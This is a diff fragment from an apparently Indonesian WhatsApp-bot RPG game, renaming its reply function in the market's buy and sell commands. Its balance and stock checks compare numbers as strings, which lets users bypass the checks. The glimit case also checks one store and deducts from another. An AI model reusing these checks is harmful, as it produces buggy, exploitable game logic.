-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 40000)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].kerbau}` < `${jumlh}`) return Reply(`*Kerbau Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].kerbau}` < `${jumlh}`) return replyV1(`*Kerbau Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].kerbau -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Kerbau: ${args[1]}
@@ -20593,14 +20566,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'monyet': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 20000)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].monyet}` < `${jumlh}`) return Reply(`*Monyet Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].monyet}` < `${jumlh}`) return replyV1(`*Monyet Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].monyet -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Monyet: ${args[1]}
@@ -20614,14 +20587,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'babihutan': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 20000)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].babihutan}` < `${jumlh}`) return Reply(`*Babi Hutan Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].babihutan}` < `${jumlh}`) return replyV1(`*Babi Hutan Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].babihutan -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Babi Hutan: ${args[1]}
@@ -20635,14 +20608,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'babi': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 20000)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].babi}` < `${jumlh}`) return Reply(`*Babi Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].babi}` < `${jumlh}`) return replyV1(`*Babi Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].babi -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Babi: ${args[1]}
@@ -20656,14 +20629,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'limit': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 100)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].limit}` < `${jumlh}`) return Reply(`*Limit Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].limit}` < `${jumlh}`) return replyV1(`*Limit Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         db.users[m.sender].limit -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Limit: ${args[1]}
@@ -20678,14 +20651,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       case 'glimit':
       case 'gamelimit': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 100)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].glimit}` < `${jumlh}`) return Reply(`*Game Limit Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].glimit}` < `${jumlh}`) return replyV1(`*Game Limit Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].glimit -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Game Limit: ${args[1]}
@@ -20699,14 +20672,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'paus': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 78000)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].paus}` < `${jumlh}`) return Reply(`*Paus Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].paus}` < `${jumlh}`) return replyV1(`*Paus Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].paus -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Paus: ${args[1]}
@@ -20720,14 +20693,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'kepiting': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 2000)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].kepiting}` < `${jumlh}`) return Reply(`*Kepiting Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].kepiting}` < `${jumlh}`) return replyV1(`*Kepiting Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].kepiting -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Kepiting: ${args[1]}
@@ -20741,14 +20714,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'gurita': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 3000)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].gurita}` < `${jumlh}`) return Reply(`*Gurita Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].gurita}` < `${jumlh}`) return replyV1(`*Gurita Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].gurita -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Gurita: ${args[1]}
@@ -20762,14 +20735,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'cumi': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 2000)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].cumi}` < `${jumlh}`) return Reply(`*Cumi Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].cumi}` < `${jumlh}`) return replyV1(`*Cumi Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].cumi -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Cumi: ${args[1]}
@@ -20783,14 +20756,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'buntal': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 1000)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].buntal}` < `${jumlh}`) return Reply(`*Buntal Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].buntal}` < `${jumlh}`) return replyV1(`*Buntal Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].buntal -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Buntal: ${args[1]}
@@ -20804,14 +20777,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'dory': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 7000)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].dory}` < `${jumlh}`) return Reply(`*Dory Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].dory}` < `${jumlh}`) return replyV1(`*Dory Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].dory -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Dory: ${args[1]}
@@ -20825,14 +20798,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'lumba': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 67400)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].lumba}` < `${jumlh}`) return Reply(`*Lumba" Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].lumba}` < `${jumlh}`) return replyV1(`*Lumba" Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].lumba -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Lumba": ${args[1]}
@@ -20846,14 +20819,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'lobster': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 3000)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].lobster}` < `${jumlh}`) return Reply(`*Lobster Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].lobster}` < `${jumlh}`) return replyV1(`*Lobster Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].lobster -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Lobster: ${args[1]}
@@ -20867,14 +20840,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'hiu': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 87500)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].hiu}` < `${jumlh}`) return Reply(`*Hiu Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].hiu}` < `${jumlh}`) return replyV1(`*Hiu Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].hiu -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Hiu: ${args[1]}
@@ -20888,14 +20861,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'udang': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 1000)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].udang}` < `${jumlh}`) return Reply(`*Udang Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].udang}` < `${jumlh}`) return replyV1(`*Udang Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].udang -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Udang: ${args[1]}
@@ -20909,14 +20882,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'orca': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 12000)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].orca}` < `${jumlh}`) return Reply(`*Orca Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].orca}` < `${jumlh}`) return replyV1(`*Orca Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].orca -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Orca: ${args[1]}
@@ -20930,14 +20903,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'potion': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 1000)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].potion}` < `${jumlh}`) return Reply(`*Potion Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].potion}` < `${jumlh}`) return replyV1(`*Potion Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].potion -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Potion: ${args[1]}
@@ -21036,20 +21009,20 @@ Tutorials :
     case 'buy':
     case 'beli': {
 
-      if (!global.db.erpg[m.sender].rpg) return Reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
-      if (text.includes('-')) return Reply('Nominal Tidak valid!!');
+      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
+      if (text.includes('-')) return replyV1('Nominal Tidak valid!!');
       let jual = args[0]
       switch (jual) {
       case 'emas': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 20500)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].emas += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Emas: ${args[1]}
@@ -21063,14 +21036,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'besi': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 1500)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].besi += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Besi: ${args[1]}
@@ -21084,14 +21057,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'batubara': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 1000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].batubara += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Batu Bara: ${args[1]}
@@ -21105,14 +21078,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'perak': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 2000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].perak += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Perak: ${args[1]}
@@ -21126,14 +21099,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'kayu': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 500)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].kayu += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Kayu: ${args[1]}
@@ -21147,14 +21120,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'ayam': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 500)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].ayam += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Ayam: ${args[1]}
@@ -21168,14 +21141,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'sapi': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 3000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].sapi += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Sapi: ${args[1]}
